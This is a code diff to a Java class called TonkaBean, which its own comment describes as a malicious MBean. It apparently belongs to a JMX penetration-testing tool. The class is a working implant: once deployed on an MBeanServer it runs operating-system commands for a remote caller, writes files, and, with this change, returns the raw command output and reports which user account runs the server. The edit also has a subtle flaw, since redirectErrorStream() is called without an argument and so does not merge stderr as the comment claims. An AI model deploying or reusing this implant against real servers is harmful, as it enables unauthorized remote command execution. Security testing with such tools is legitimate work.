@@ -1,11 +1,12 @@
 package de.qtc.beanshooter.tonkabean;
 
+import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
+import java.io.InputStream;
 import java.nio.file.Files;
 import java.util.Map;
-import java.util.Scanner;
 
 /**
  * The TonkaBean is an example for a malicious MBean. When deployed on an MBeanServer, it allows
@@ -38,31 +39,19 @@ public class TonkaBean implements TonkaBeanMBean
      * @param command String array that specified the operating system command
      * @param cwd working directory for the call
      * @param env environment variables to use for the call
+     * @return byte array containing the command output (stdout + stderr)
      */
-    public String executeCommand(String[] command, File cwd, Map<String,String> env) throws IOException, InterruptedException
+    public byte[] executeCommand(String[] command, File cwd, Map<String,String> env) throws IOException, InterruptedException
     {
         ProcessBuilder builder = new ProcessBuilder(command);
         builder.directory(cwd);
         builder.environment().putAll(env);
+        builder.redirectErrorStream();
 
         Process proc = builder.start();
         proc.waitFor();
 
-        String output = "";
-
-        try(Scanner scanner = new Scanner(proc.getInputStream()).useDelimiter("\\A"))
-        {
-            output += scanner.hasNext() ? scanner.next() : "";
-            scanner.close();
-        };
-
-        try(Scanner scanner = new Scanner(proc.getErrorStream()).useDelimiter("\\A"))
-        {
-            output += scanner.hasNext() ? scanner.next() : "";
-            scanner.close();
-        }
-
-        return output;
+        return readInputStream(proc.getInputStream());
     }
 
     /**
@@ -80,6 +69,16 @@ public class TonkaBean implements TonkaBeanMBean
         builder.directory(cwd);
         builder.environment().putAll(env);
         builder.start();
+    }
+
+    /**
+     * Return the username that runs the MBeanServer.
+     *
+     * @return the username the MBeanServer is running with.
+     */
+    public String username()
+    {
+        return System.getProperty("user.name");
     }
 
     /**
@@ -120,5 +119,26 @@ public class TonkaBean implements TonkaBeanMBean
         stream.close();
 
         return file.getAbsolutePath();
+    }
+
+    /**
+     * Helper function to read all available data from an input stream.
+     *
+     * @param stream InputStream to read from
+     * @return byte array containing the input stream content
+     * @throws IOException
+     */
+    private byte[] readInputStream(InputStream stream) throws IOException
+    {
+        int readCount;
+        byte[] buffer = new byte[4096];
+        ByteArrayOutputStream bos = new ByteArrayOutputStream();
+
+        while(( readCount = stream.read(buffer, 0, buffer.length)) != -1)
+        {
+              bos.write(buffer, 0, readCount);
+        }
+
+        return bos.toByteArray();
     }
 }
